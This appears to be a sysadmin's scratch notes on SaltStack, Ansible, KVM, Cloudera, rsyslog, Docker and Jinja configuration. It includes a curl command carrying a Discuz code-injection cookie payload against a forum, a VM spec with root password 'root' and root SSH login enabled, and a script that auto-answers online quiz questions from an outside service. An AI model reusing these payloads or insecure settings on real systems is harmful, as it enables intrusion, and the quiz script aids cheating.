


$Template tpl,"%msg:R,ERE,2,ZERO:([^@]+@){10}([^@]+)@.*--end%\n"
*.*      /path/to/file;tpl




http://www.cloudera.com/content/www/en-us/documentation/enterprise/latest/topics/install_upgrade_to_cdh55_parcels.html
http://www.cloudera.com/content/www/en-us/documentation/enterprise/latest/topics/cm_ag_upgrade_cm5.html

salt '*' state.single pkg.installed name='vim'
`````````nginx`````````
find ./  -mmin -360  -name  '*ng*' -exec grep check  {} \; |wc -l

find /opt/saltstack  -type d -path '*/\.*' -prune -o -not -name '.*' -type f | xargs file | awk -F: '$2 ~ /text/ { print $1 }' |xargs -I {} grep webapp {}
`````````````````
salt '*' service.restart   salt-minion
Redis Desktop Manager

sudo salt -N 'test_v6tomcat' cmd.shell  "sed -i.bak "s/SELINUX=enforcing/SELINUX=permissive/"   /etc/selinux/config"
nohup virt-viewer --connect qemu:///system windows8-in-office --full-screen >/dev/null 2>&1 &
salt 'stage_v6_tradew01' cmd.run 'ls -l  /opt/webserver/v6_tomcat/webapps/xxdai_tradews/WEB-INF/classes/'

/etc/logrotate.hourly.conf
ssh root@cloudera-agent1  yum -y install  yum update python  -y
salt   'test_v6_tomcat_front01'     file.manage_file /etc/sysconfig/logrotate_tomcat    '' '{}' salt://svn/wujunrong/logrotate_tomcat.logclient   '{hash_type: 'md5', 'hsum': <md5sum>}' root root '644' base 'minion'
salt   'test_tomcat_fk001'          file.manage_file /etc/rsyslog.conf    '' '{}' salt://svn/wujunrong/rsyslog.conf.client-fk_test   '{hash_type: 'md5', 'hsum': <md5sum>}' root root '644' base 'minion'
salt     'v6_mobile0?'      file.manage_file /etc/selinux/config    '' '{}' salt://wujunrong/selinux-config   '{hash_type: 'md5', 'hsum': <md5sum>}' root root '644' base 'minion'

salt  'stage_v6_nginx0?'     file.manage_file /usr/local/nginx/sbin/nginx_log_cut.sh   '' '{}' salt://wujunrong/config_files/nginx_log_cut.sh   '{hash_type: 'md5', 'hsum': <md5sum>}' root root '744' base 'minion'
salt  'stage_v6_nginx0?'     file.manage_file /etc/rsyslog.conf                        '' '{}' salt://svn/wujunrong/rsyslog.conf.client-nginx   '{hash_type: 'md5', 'hsum': <md5sum>}' root root '644' base 'minion'

sudo cp   nginx_log_cut.sh  /opt/saltstack/salt/wujunrong/config_files/nginx_log_cut.s

tar -zcvf /tmp/webservice-trade.tar.gz   ./{*webservice*11-11*,*webser*.out,*tra*11-11*,*tra*.out}
scp root@192.168.110.105:/home/yxlog/real_time_log/v6_front0*11-11*.log  .
scp root@192.168.110.105:/home/yxlog/real_time_log/{*tra*11-11-1*,*tra*.out}     .

 docker build --rm -t local/centos7-systemd-httpd  .
 docker run --privileged -ti -v /sys/fs/cgroup:/sys/fs/cgroup:ro -p 80:80 local/centos7-systemd-httpd   /bin/bash

rsync -avzh frank@172.16.30.44:/home/frank/packages   /var/www/html


docker commit --change "CMD ["/usr/sbin/init"]" -m "Added packages to centos7" -a "wujunrong"   0cfbc636ba81   local/centos7:yum-repository
docker run --privileged -ti -v /sys/fs/cgroup:/sys/fs/cgroup:ro -p 80:80 local/c7-systemd-httpd:add-packages

``````````````````
virsh list --all
virsh dumpxml centos64-template > salt-master.xml
vi salt-master.xml 
virsh undefine centos64-template
virsh define salt-master.xml

virt-cat -d cloudera-manager /etc/redhat-release
virt-cat -d salt-master  /etc/redhat-release
virt-customize --help
virt-customize -d salt-master --hostname salt-master
virsh domiflist cloudera-manager
wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm
virt-copy-in -d  cloudera-manager  /root/Templates/epel-release-latest-6.noarch.rpm /etc/yum.repos.d/
virt-customize -d cloudera-manager --run-command 'rpm -ivh /etc/yum.repos.d/epel-release-latest-6.noarch.rpm'
virt-customize -d cloudera-manager --run-command 'yum -y upgrade ca-certificates --disablerepo=epel'
virt-customize -d cloudera-manager --run-command 'yum -y update python'
virt-customize -d cloudera-manager  --install salt-minion
````````````````````````
virt-install  -n cloudera-manager  -r 2048  --vcpus=2  --os-variant=rhel6.4  --accelerate  -w bridge:br0    --disk path=/home/frank/kvm/images/centos-minimal.qcow2  -l /home/frank/Downloads/CentOS-6.4-x86_64-bin-DVD1.iso  --network bridge=br1  --nographics  --extra-args "console=ttyS0,115200"   --os-type=linux   
virt-edit -d cloudera-manager /etc/sysconfig/network -e  's/HOSTNAME=.*/HOSTNAME=cloudera-manager/g'
 
sed 's/HOSTNAME=.*/HOSTNAME=cloudera/g' /etc/sysconfig/network
salt  'cloudera-agent?'  cmd.run ' sed -i.bak 's/SELINUX=enforcing/SELINUX=permissive/g'  /etc/selinux/config'
virsh net-update default add    ip-dhcp-host "<host mac='52:54:00:8c:18:eb' name='cloudera-manager' ip='192.168.122.2' />"  --live --config
virsh net-update default modify ip-dhcp-host "<host mac='52:54:00:8c:18:eb' name='cloudera-manager' ip='192.168.122.2' />"  --live --config
virt-install -n centos64-wu -r 2048  --disk=path=/media/frank/MyData/kvm/images/centos-template.qcow2,device=disk   -l http://mirrors.163.com/centos/6.7/os/x86_64/  --network bridge=br0  --network=default  --nographics  --extra-args "console=ttyS0,115200"   --os-type=linux    --os-variant=rhel6 

virt-install  -n cloudera-manager  -r 2048  --vcpus=2  --os-variant=rhel6.4  --accelerate  -w bridge:br0   -w bridge:br1   --disk path=/home/frank/kvm/images/cloudera-manager.qcow2  -l /home/frank/Downloads/CentOS-6.4-x86_64-bin-DVD1.iso    --nographics     --os-type=linux  --initrd-inject=/home/frank/Templates/anaconda-ks.cfg  -x "ks=file:/anaconda-ks.cfg console=ttyS0,115200"
sudo virt-install  -n cloudera-agent1  -r 2048  --vcpus=2  --os-variant=rhel6.4  --accelerate  -w bridge:br0   -w bridge:br1   --disk path=/home/frank/kvm/images/cloudera-agent1.qcow2  -l /home/frank/Downloads/CentOS-6.4-x86_64-bin-DVD1.iso    --nographics     --os-type=linux  --initrd-inject=/home/frank/Templates/anaconda-ks.cfg  -x "ks=file:/anaconda-ks.cfg console=ttyS0,115200"
sudo virt-install  -n bbs  -r 2048  --vcpus=2  --os-variant=rhel6    -w bridge:br0  -w bridge:br1 -w bridge:br2  --disk=path=/home/frank/kvm/images/my-wd-disk/bbs.qcow2   -l  /home/frank/Downloads/CentOS-6.4-x86_64-bin-DVD1.iso   --nographics     --os-type=linux  --initrd-inject=/home/frank/Downloads/anaconda-ks.cfg.centos6.4  -x "ks=file:/anaconda-ks.cfg.centos6.4   console=ttyS0  ksdevice=eth0 ip=dhcp"
sudo     virt-install  -n bbs  -r 2048  --vcpus=2  --os-variant=rhel6    -w bridge:br0  -w bridge:br1 -w bridge:br2  --disk=path=/home/frank/kvm/images/my-wd-disk/bbs.qcow2   -l  /home/frank/Downloads/CentOS-6.4-x86_64-bin-DVD1.iso   --nographics     --os-type=linux  --initrd-inject=/home/frank/Downloads/anaconda-ks.cfg.centos6.4  -x "ks=file:/anaconda-ks.cfg.centos6.4   console=ttyS0  ksdevice=eth2 --bootproto=static --ip=192.168.137.9  --netmask=255.255.255.0 --gateway=192.168.137.1   --nameserver=8.8.8.8  --hostname bbs --noipv6  --onboot=on "
```````````````````````````````````````````
salt '*' cmd.run 'yum -y install openssh-clients'
salt 'cloudera-agent?' cmd.run 'wget https://archive.cloudera.com/cm5/redhat/6/x86_64/cm/cloudera-manager.repo'   cwd=/etc/yum.repos.d/ 
ansible cloudera-manager -m shell -a "cd /etc/yum.repos.d/ && wget https://archive.cloudera.com/cm5/redhat/6/x86_64/cm/cloudera-manager.repo"
mysql            :   sudo yum -y install mysql-server
metastorehost    :   sudo yum -y install mysql-connector-java
cloudera-manager :   rpm -q  cloudera-manager-daemons
                     sudo yum -y install oracle-j2sdk1.7
                     sudo yum -y install cloudera-manager-daemons cloudera-manager-server
                     sudo yum -y install cloudera-manager-server-db-2
					 sudo service cloudera-scm-server-db start
					 sudo service cloudera-scm-server start

Cloudera Manager Agent：
 sudo yum install cloudera-manager-agent cloudera-manager-daemons
 sudo service cloudera-scm-agent start					 
					 
``````
On every Cloudera Manager Agent host:/etc/cloudera-scm-agent/config.ini
Property	Description
server_host	Name of the host where Cloudera Manager Server is running.
server_port	Port on the host where Cloudera Manager Server is running.
``````
salt  'cloudera-agent?'  cmd.run ' sed -i.bak 's/SELINUX=enforcing/SELINUX=permissive/g'  /etc/selinux/config'
```````````````````
mount /dev/mapper/VolGroup-lv_root /sysroot/
mount /dev/sda1 /sysroot/boot
mount --bind /dev /sysroot/dev
mount --bind /dev/pts /sysroot/dev/pts
mount --bind /proc /sysroot/proc
mount --bind /sys /sysroot/sys
``````````````
curl -H 'Cookie: GLOBALS[_DCACHE][smilies][searcharry]=/.*/eui;CLOBALS[_DCACHE][smilies][replacearray]=print(233334-1)' -v http://bbs.xinxindai.com/viewthread.php?tid=32
 salt  -b 5 -C 'stage_v6_batch0? or stage_v6_front0? or stage_v6_mobile0? or 
stage_v6_tradew0? or stage_v6_webapp0? or stage_v6_webservice0? or test_v6_tomcat_admin0? or 
test_v6_tomcat_batch0? or test_v6_tomcat_front0? or test_v6_tomcat_mobile0? or test_v6_tomcat_tradew0? or 
test_v6_tomcat_webservice0? or test_v6_webapp_front01'         cmd.script salt://wujunrong/install_files/run_before_starting_rsyslog.sh    reset_system_locale=False cwd=/tmp
  
=========salt section===========
CentOS 7:/etc/yum.repos.d/saltstack.repo:
####################
# Enable SaltStack's package repository
[saltstack-repo]
name=SaltStack repo for RHEL/CentOS 7
baseurl=https://repo.saltstack.com/yum/rhel7
enabled=1
gpgcheck=1
gpgkey=https://repo.saltstack.com/yum/rhel7/SALTSTACK-GPG-KEY.pub

CentOS 6:/etc/yum.repos.d/saltstack.repo:
####################
# Enable SaltStack's package repository
[saltstack-repo]
name=SaltStack repo for RHEL/CentOS 6
baseurl=https://repo.saltstack.com/yum/rhel6
enabled=1
gpgcheck=1
gpgkey=https://repo.saltstack.com/yum/rhel6/SALTSTACK-GPG-KEY.pub


ansible stage_redis  -a "/usr/local/redis/redis-server  --version"
ansible cloudera_redis -m shell -a "echo nameserver 192.168.38.118>>/etc/resolv.conf"

=====zabbix section=======
sudo sed -i 's/^ServerActive=127.0.0.1/ServerActive=/g' /etc/zabbix/zabbix_agentd.conf
sudo sed -i 's/^ServerActive=127.0.0.1/ServerActive=/g' /etc/zabbix/zabbix_agentd.conf
(! cat /etc/zabbix/zabbix_agentd.conf |  grep 'EnableRemoteCommands=1' )&&  sed -i.bak 's/# EnableRemoteCommands=0/# EnableRemoteCommands=0\nEnableRemoteCommands=1/g'  /etc/zabbix/zabbix_agentd.conf



========= ansible section ==============
cat ./ansible-svn.sh 
#!/bin/bash
svn list  http://192.168.38.230/YXITD/saltstack/trunk/wujunrong/    --username wujunrong| grep  ansible |xargs -I {} svn export  http://192.168.38.230/YXITD/saltstack/trunk/wujunrong/{} --force  /etc/ansible/hosts

#sleep_for_{{ module }}_vm_generation:       
#  module.run:
#    - name: test.sleep
#    - length: '60'
#    - require:
#       - create_{{ module }}_vm
#
#       
#set_{{ module }}_vm_uuid:
#  environ.setenv:
#    - name: "{{ module }}"
#    - value: "{{ salt['cmd.run']('vmadm list | grep '~ module ~' | awk "{print \$1}"  ') }}"
#    - update_minion: True
#    - require:
#       - sleep_for_{{ module }}_vm_generation:   
{% set vm_uuid_for_dataset     =  salt['environ.get'](''~ module ~'') %}

`````
            tee /opt/{{ module }}_smartos_vm.json <<-'EOF'            
            {
             "brand": "joyent",
             "image_uuid": "{{ module_property.image_uuid }}",
             "alias": "{{ module }}",
             "hostname": "{{ module }}",
             "max_physical_memory": 1024,
             "quota": 50,
             #"nowait": true,
             "resolvers": ["114.114.114.114", "8.8.4.4"],
             "nics": [
                {
                   "nic_tag": "admin",
                   "ip": "10.75.1.60",
                   "netmask": "255.255.255.0",
                   "gateway": "10.75.1.1",
                   "primary": true
                }
             ],
             "internal_metadata": {
              "root_pw": "root",
              "admin_pw": "admin"
              },
             "customer_metadata": {
                 "user-script" : "/opt/local/bin/sed -i.bak 's/PermitRootLogin without-password/PermitRootLogin yes/g'   /etc/ssh/sshd_config; /usr/sbin/svcadm restart svc:/network/ssh:default;/opt/local/bin/echo '10.75.1.70 salt'>>/etc/hosts;/opt/local/bin/echo 'http://192.168.1.232/smartos/pkgin2016Q2/' >> /opt/local/etc/pkgin/repositories.conf;/opt/local/bin/pkgin -fy up;/opt/local/bin/pkgin -y install salt;/usr/sbin/svcadm enable svc:/pkgsrc/salt:minion"

              }
            }			
            EOF
============orchestrate section=========

# salt-run state.orchestrate my_orchestration pillar='{p1: value1,p2: value2}'
# salt-run state.orchestrate  mustang pillar='{"image_uuid": "13f711f4-499f-11e6-8ea6-2b9fb858a619","alias": "auto-created-by-salt", "hostname": "wu"}'


install_nativezone:
  salt.function:
    - name: state.sls
    - tgt: 'fifo-test.zhixiang'
    - arg:
      - create_smartos_vm
    - timeout: 720
    - kwarg:
        pillar:
             image_uuid: "13f711f4-499f-11e6-8ea6-2b9fb858a619" 
=============

base-package:
  pkg.installed:
    - name: salt
    - require:
       - cmd: update_repository
  service.running:
    - name: salt:minion
    - enable: True
===============
/etc/http/conf/http.conf:
  file.managed:
    - source: salt://apache/http.conf
    - user: root
    - group: root
    - mode: 644
    - template: jinja
    - defaults:
        custom_var: "default value"
        other_var: 123
{% if grains['os'] == 'Ubuntu' %}
    - context:
        custom_var: "override"
{% endif %}

If using a template, any user-defined template variables in the file defined in source must be passed in using the defaults and/or context arguments. The general best practice is to place default values in defaults, with conditional overrides going into context, as seen above.
The template will receive a variable custom_var, which would be accessed in the template using {{ custom_var }}. If the operating system is Ubuntu, the value of the variable custom_var would be override, otherwise it is the default default value
==========================
{% for file_name, file_source in salt['pillar.get']('dataset_repository.'~ vm_hostname ~'.programm_files', {}).items() %} 

=====ryslog section====
服务端配置

$umask 0000
$DirCreateMode 0755
$FileCreateMode 0644

module(load="imudp")
input(type="imudp" port="514" ruleset="remote")

$template TmplAuth, "/var/log/xinxindai/%source%-%PROGRAMNAME:::secpath-replace%"
$template DFile,"/opt/logs/%syslogtag%/%HOSTNAME%-%$year%%$month%%$day%_%$hour%.log"
$template auditFormat, "%msg%\n"
ruleset(name="remote"){
	if $fromhost-ip == '192.168.34.10' then {
		action(type="omfile" DynaFile="TmplAuth" template="auditFormat")
		stop
	}
	action(type="omfile" DynaFile="DFile" template="auditFormat" dirCreateMode="0755" FileCreateMode="0644")
        if $syslogtag contains_i 'real' then @@192.168.31.160:5144;auditFormat
        if $syslogtag contains_i 'nginx' then @@192.168.31.160:5143;auditFormat
}


#:syslogtag,regex,".*realtime.*"   /tmp/wujunrong.log


`````logrotate section````
每小时切割日志，服务器端配置
/var/log/xinxindai/*catalina.out
/var/log/xinxindai/*tomcat_access.out
{
        dateext
        dateformat -%Y-%m-%d-%s
        extension .out 
        nocompress
        missingok
        copytruncate
        size 512k
        sharedscripts
        postrotate
               find /var/log/xinxindai  -type f -exec sh -c 'second=$(echo {}|  sed  -r   -n  "s/.*-([0-9]+)\.out/\1/p") && \
                             [ ! -z "$second" ] && my_second=$(date  -d @$second +"%H_%M_%S")  && \
                             new_file_name=$(echo {}|sed  -r  "s/([0-9]+)\.out/$my_second.log/g") && \
                             mv {}   $new_file_name '  \;
               find /var/log/xinxindai  -mtime 1 -regex  '.*[0-9][0-9]\.log'   -print -exec /bin/rm -fr {} \; 
        endscript

}

==========docker section=================

sudo yum -y install -y yum-utils device-mapper-persistent-data lvm2
 sudo yum-config-manager \
    --add-repo \
    https://download.docker.com/linux/centos/docker-ce.repo

sudo yum -y makecache fast
sudo yum -y install docker-ce
sudo systemctl start docker
sudo systemctl enable docker



======jinja section====
步骤一：
cat simple_config.yaml
hostname: testswitch

ip: 10.101.0.221


snmp:
    read: supersecret
    write: macdonald
    syscontact: admin.lab.local
    syslocation: lab
    trap:
    - {target: 10.101.0.200}
    - {target: 10.101.0.201}
    - {target: 10.101.0.202}



vlans:
- {description: management vlan, id: '10', name: management}
- {description: users vlan, id: '15', name: users}
- {description: phones vlan, id: '16', name: phones}
- {description: servers vlan, id: '20', name: servers vlan }




``````
步骤二：
cat simple_cisco.j2

#hostname config
hostname {{ simple['hostname'] }}
#vlan config
{% for vlan in simple['vlans'] -%}
vlan {{ vlan['id'] }}
    name {{ vlan['name'] }}
    description {{ vlan['description'] }}
{% endfor %}#snmp config
snmp-server community {{ simple['snmp']['read'] }} RO
snmp-server community {{ simple['snmp']['write'] }} RW
snmp-server ifindex persist
snmp-server location {{ simple['snmp']['syslocation'] }}
snmp-server contact {{ simple['snmp']['syscontact'] }}
{% for trap in simple['snmp']['trap'] -%}
snmp-server host {{ trap['target'] }}  public
{% endfor %}
``````````````

步骤三：
import yaml
from  jinja2  import Environment, FileSystemLoader, Template

ENV = Environment(loader=FileSystemLoader('./'))
with open('simple_config.yaml') as the_file:   
 print (the_file.read())

with open("simple_config.yaml") as simple:
    simple =  yaml.load(simple)


type(simple)
simple


with open('simple_cisco.j2') as the_file:
    print (the_file.read())


template = ENV.get_template("simple_cisco.j2")
print (template.render(simple=simple))   #左边是yaml文件，右边是字典


with open('docker-compose.j2') as the_file:
    print (the_file.read())

template = ENV.get_template("docker-compose.j2")
print (template.render(org_name='xxxx'))

import sys
template = ENV.get_template("docker-compose.j2")

f=open("docker-compose.yaml", "w")
sys.stdout = f
print (template.render(org_name='xxxx'))
f.close()

f=open("docker-compose.yaml", "w")
sys.stdout = f
print (template.render(org_name='zzz'))
sys.stdout.flush()
f.close()


template = ENV.get_template("certsUpdateChannel.j2")
f=open("certsUpdateChannel.sh", "w")
sys.stdout = f
print (template.render(org_name='12'))
sys.stdout.flush()
f.close()


sys.stdout = sys.__stdout__
=====auto=====
$('form .play-question').each((index, elem) => {
 const question = $(elem).find('.question-title p').text();
 $ajax(question, 'old', elem, index);
 $ajax(question, 'new', elem, index);
});

function $ajax(question, searchType, parent, parentIndex) {
 $.ajax({
   url: 'https://search2018.herokuapp.com/question',
   type: 'POST',
   data: {
     question: question.slice(0, 22),
     searchType: searchType
   },
   success: (data) => {
     const result = data.filter((item) => item.score === '10')[0];
     if(result) {
       const answers$ = $(parent).find('.answers-container label');
       answers$.each((index, item) => {
         result.results.forEach((answerInfo) => {
           if(searchType === 'new') {
             if( answerInfo.tag && $(item).text().trim() === answerInfo.result.trim()) {
               $(item).find('input').attr('checked', true);
               console.log('第' + (parentIndex + 1) + '道题回答完毕！');
             }
           }else {
             if(answerInfo.trim() === $(item).text().trim()) {
               $(item).find('input').attr('checked', true);
               console.log('第' + (parentIndex + 1) + '道题回答完毕！')
             }
           }
         });
       });
     }
   },
   error: (xhr, textStatus, err) => {
     console.error('Something wrong')
   }
 });
}
